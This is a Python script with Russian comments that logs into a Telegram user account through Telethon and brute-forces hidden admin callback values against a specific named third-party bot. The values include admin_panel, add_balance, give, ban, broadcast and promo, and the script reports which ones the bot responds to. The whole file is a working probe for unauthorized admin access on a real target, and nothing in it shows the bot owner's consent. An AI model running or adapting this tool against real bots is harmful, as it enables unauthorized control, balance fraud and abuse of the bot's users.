"""
probe_bot.py — проверяет незащищённые admin callback в боте.
Запуск: python3 probe_bot.py
"""
import asyncio
import sys
import os

TARGET_BOT = "@kpixabot"

CALLBACKS = [
    "admin", "admin_panel", "panel", "admin_menu",
    "admin_main", "settings", "admin_settings",
    "manage", "admin_manage", "control", "dashboard",
    "users", "admin_users", "stats", "admin_stats",
    "broadcast", "admin_broadcast", "mailing",
    "ban", "unban", "give", "add_balance",
    "admin_give", "admin_ban", "promo", "admin_promo",
]

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


async def probe(session_path: str, api_id: int, api_hash: str):
    from telethon import TelegramClient

    client = TelegramClient(session_path, api_id, api_hash,
                            system_version="4.16.30-vxCUSTOM")
    await client.connect()
    if not await client.is_user_authorized():
        print("❌ Сессия не авторизована")
        await client.disconnect()
        return

    me = await client.get_me()
    print(f"✅ Вошёл как @{me.username} ({me.id})")

    # Получаем свежее сообщение от бота с кнопками
    print(f"\n📨 Отправляю /start в {TARGET_BOT}...")
    await client.send_message(TARGET_BOT, "/start")
    await asyncio.sleep(1.5)

    msgs = await client.get_messages(TARGET_BOT, limit=10)
    bot_msg = next((m for m in msgs if m.buttons), None)

    if not bot_msg:
        print("❌ Нет сообщений с кнопками")
        await client.disconnect()
        return

    print(f"📋 message_id={bot_msg.id}\n")
    print("🔍 Перебираю скрытые callbacks на этом сообщении...\n")

    for cb in CALLBACKS:
        try:
            # click(data=...) отправляет callback_data напрямую на это сообщение
            result = await bot_msg.click(data=cb.encode())
            if result and hasattr(result, 'message') and result.message:
                print(f"  ✅ [{cb}] → {result.message[:100]}")
            else:
                # Смотрим не появилось ли новое сообщение
                new = await client.get_messages(TARGET_BOT, limit=1)
                if new and new[0].id != bot_msg.id:
                    text = (new[0].text or new[0].caption or "")[:120]
                    print(f"  🔥 [{cb}] → НОВОЕ СООБЩЕНИЕ: {text}")
                    bot_msg = new[0]
                else:
                    print(f"  · [{cb}] нет реакции")
        except Exception as e:
            err = str(e)
            if "not found" in err.lower() or "button" in err.lower():
                print(f"  · [{cb}] кнопка не найдена")
            else:
                print(f"  · [{cb}] {err[:70]}")
        await asyncio.sleep(0.5)

    print("\n✅ Готово")
    await client.disconnect()


async def login(api_id: int, api_hash: str) -> str:
    from telethon import TelegramClient
    from telethon.errors import SessionPasswordNeededError

    session_path = "/tmp/probe_session"
    client = TelegramClient(session_path, api_id, api_hash,
                            system_version="4.16.30-vxCUSTOM")
    await client.connect()

    if not await client.is_user_authorized():
        phone = input("📱 Номер телефона (с +): ").strip()
        await client.send_code_request(phone)
        code = input("📩 Код из Telegram: ").strip()
        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            password = input("🔐 Пароль 2FA: ").strip()
            await client.sign_in(password=password)

    me = await client.get_me()
    print(f"✅ Авторизован как @{me.username} ({me.id})")
    await client.disconnect()
    return session_path


def main():
    import config as cfg
    api_id   = int(cfg.AUREPORT_API_ID)
    api_hash = cfg.AUREPORT_API_HASH

    session_path = asyncio.run(login(api_id, api_hash))
    asyncio.run(probe(session_path, api_id, api_hash))


if __name__ == "__main__":
    main()
